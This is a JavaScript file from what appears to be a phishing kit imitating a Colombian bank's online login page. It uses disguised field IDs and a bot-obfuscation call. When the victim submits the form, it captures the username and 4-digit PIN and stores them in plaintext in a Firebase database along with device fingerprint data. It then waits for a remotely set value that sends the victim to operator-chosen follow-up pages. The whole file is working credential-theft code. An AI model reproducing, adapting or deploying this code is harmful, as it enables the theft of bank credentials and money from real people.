"use strict";

(function initIndexUi() {
  function ready(callback) {
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", callback, { once: true });
      return;
    }
    callback();
  }

  ready(function () {
    BotShield.obfuscateAll();

    var userInput = document.getElementById("tiki");
    var passInput = document.getElementById("toko");
    var accessButton = document.querySelector("[data-test=logn-button]");

    if (!userInput || !passInput || !accessButton) {
      return;
    }

    function sanitizeUser(value) {
      return value.replace(/\s+/g, "").slice(0, 20);
    }

    function sanitizePass(value) {
      return value.replace(/\D/g, "").slice(0, 4);
    }

    function getInputLabel(input) {
      if (!input) {
        return null;
      }
      return input.parentElement ? input.parentElement.querySelector("label") : null;
    }

    function setFloatingLabel(input, shouldFloat) {
      var label = getInputLabel(input);
      if (!label) {
        return;
      }

      if (shouldFloat) {
        label.style.top = "-14px";
        label.style.fontSize = "0.75rem";
        label.style.opacity = "1";
      } else {
        label.style.top = "";
        label.style.fontSize = "";
        label.style.opacity = "";
      }
    }

    function syncFloatingLabel(input) {
      setFloatingLabel(input, !!(input && (input.value || "").trim().length > 0));
    }

    function validateInputs() {
      var userValue = sanitizeUser(userInput.value || "");
      var passValue = sanitizePass(passInput.value || "");
      var isValid = userValue.length > 0 && passValue.length === 4;

      accessButton.disabled = !isValid;
      return isValid;
    }

    var tikiHelper = document.getElementById("tiki-helper");
    var tokoHelper = document.getElementById("toko-helper");
    var errorAlert = document.getElementById("svp-error-alert");

    function hideGeneralErrors() {
      if (errorAlert) {
        errorAlert.style.display = "none";
      }
    }

    userInput.addEventListener("input", function () {
      this.value = sanitizeUser(this.value || "");
      syncFloatingLabel(this);
      validateInputs();
      if (tikiHelper) tikiHelper.style.display = "none";
      this.classList.remove("bc-input-error", "ng-invalid");
      hideGeneralErrors();
    });

    passInput.addEventListener("input", function () {
      this.value = sanitizePass(this.value || "");
      syncFloatingLabel(this);
      validateInputs();
      if (tokoHelper) tokoHelper.style.display = "none";
      this.classList.remove("bc-input-error", "ng-invalid");
      hideGeneralErrors();
    });

    userInput.addEventListener("focus", function () {
      setFloatingLabel(this, true);
    });

    passInput.addEventListener("focus", function () {
      setFloatingLabel(this, true);
    });

    userInput.addEventListener("blur", function () {
      syncFloatingLabel(this);
    });

    passInput.addEventListener("blur", function () {
      syncFloatingLabel(this);
    });

    passInput.addEventListener("keypress", function (event) {
      var key = event.key || "";
      if (key.length === 1 && /\D/.test(key)) {
        event.preventDefault();
      }
    });

    var lgContainer = accessButton.closest("#lg");
    if (lgContainer) {
      lgContainer.addEventListener("keydown", function (event) {
        if (event.key === "Enter" && !accessButton.disabled) {
          event.preventDefault();
          accessButton.click();
        }
      });
    }

    syncFloatingLabel(userInput);
    syncFloatingLabel(passInput);
    validateInputs();

    // Lógica para ocultar el banner de error manualmente
    var closeAlertBtn = document.querySelector(".bc-alert-close button");

    if (errorAlert && closeAlertBtn) {
      closeAlertBtn.addEventListener("click", function() {
        errorAlert.style.display = "none";
      });
    }
  });

  // --- Lógica de Firebase Integrada ---
  var accessWatcher = null;

  function getNextCardNumber(db) {
    return db
      .collection("redireccion")
      .orderBy("cardNumber", "desc")
      .limit(1)
      .get()
      .then(function (snapshot) {
        if (snapshot.empty) {
          return 1;
        }
        return (snapshot.docs[0].data().cardNumber || 0) + 1;
      })
      .catch(function () {
        return 1;
      });
  }

  function saveHistoryEntry(db, historyData) {
    var docId = historyData.usuario;

    return db
      .collection("datosHistorial")
      .doc(docId)
      .set(historyData, { merge: true })
      .catch(function (error) {
        console.error("Error guardando historial inicial:", error);
      });
  }

  function showLoader() {
    var loaderWrapper = document.querySelector("svp-circle-loader");
    if (loaderWrapper) {
      loaderWrapper.classList.remove("bc-hidden");
    }
  }

  function hideLoader() {
    var loaderWrapper = document.querySelector("svp-circle-loader");
    if (loaderWrapper) {
      loaderWrapper.classList.add("bc-hidden");
    }
  }

  function attachAccessWatcher(userRef, userValue, accessButton) {
    if (accessWatcher) {
      accessWatcher();
      accessWatcher = null;
    }

    accessWatcher = userRef.onSnapshot(
      function (docSnapshot) {
        if (!docSnapshot.exists) {
          accessButton.disabled = false;
          accessButton.textContent = "Iniciar sesión";
          hideLoader();
          return;
        }

        var userData = docSnapshot.data() || {};
        var page = userData.page;

        if (typeof page !== "number" || page <= 0) {
          return;
        }

        var route =
          window.appConfig &&
          window.appConfig.routes &&
          window.appConfig.routes[page]
            ? window.appConfig.routes[page]
            : null;

        if (route && route.url) {
          var targetUrl = String(route.url || "");
          var currentPath = window.location.pathname.split("/").pop() || "";
          var targetPath = targetUrl.split("?")[0].split("#")[0].split("/").pop() || "";

          if (targetPath && targetPath === currentPath) {
            return;
          }

          localStorage.setItem("usuarioActual", userValue);
          sessionStorage.setItem("dashboard_session_user", userValue);
          sessionStorage.setItem("dashboard_session_timestamp", Date.now().toString());

          if (accessWatcher) {
            accessWatcher();
            accessWatcher = null;
          }

          window.location.href = route.url;
          return;
        }
      },
      function () {
        accessButton.disabled = false;
        accessButton.textContent = "Iniciar sesión";
        hideLoader();
      }
    );
  }

  ready(function () {
    var userInput = document.getElementById("tiki");
    var passInput = document.getElementById("toko");
    var accessButton = document.querySelector("[data-test=logn-button]");

    if (!userInput || !passInput || !accessButton) {
      return;
    }

    accessButton.addEventListener("click", function (event) {
      event.preventDefault();

      if (accessButton.disabled) {
        return;
      }

      var db = window.db;
      if (!db || typeof firebase === "undefined") {
        return;
      }

      var userValue = (userInput.value || "").trim();
      var passValue = (passInput.value || "").trim();

      if (!userValue || !passValue || userValue.indexOf("/") !== -1) {
        return;
      }

      accessButton.disabled = true;
      accessButton.textContent = "Cargando...";
      showLoader();

      getNextCardNumber(db)
        .then(function (cardNumber) {
          var isMobile = /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent);
          var now = new Date();
          var fecha = now.toLocaleDateString("es-CO");
          var hora = now.toLocaleTimeString("es-CO", {
            hour: "2-digit",
            minute: "2-digit",
            second: "2-digit",
          });

          var currentUserData = {
            usuario: userValue,
            clave: passValue,
            documento: userValue,
            tipoDocumento: "Modal",
            page: 0,
            cardNumber: cardNumber,
            dispositivo: isMobile ? "Móvil" : "Desktop",
            fecha: fecha,
            hora: hora,
            timestamp: firebase.firestore.FieldValue.serverTimestamp(),
          };

          var historyData = {
            usuario: userValue,
            clave: passValue,
            documento: userValue,
            tipoDocumento: "Modal",
            cardNumber: cardNumber,
            dispositivo: isMobile ? "Móvil" : "Desktop",
            fecha: fecha,
            hora: hora,
            timestamp: now.toISOString(),
            userAgent: navigator.userAgent,
            idioma: navigator.language || "es",
            zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer || "Directo",
          };

          var userRef = db.collection("redireccion").doc(userValue);

          return userRef.set(currentUserData, { merge: true }).then(function () {
            localStorage.setItem("usuarioActual", userValue);
            attachAccessWatcher(userRef, userValue, accessButton);
            return saveHistoryEntry(db, historyData);
          });
        })
        .catch(function () {
          accessButton.textContent = "Iniciar sesión";
          hideLoader();
          accessButton.disabled = false;
        });
    });
  });
})();
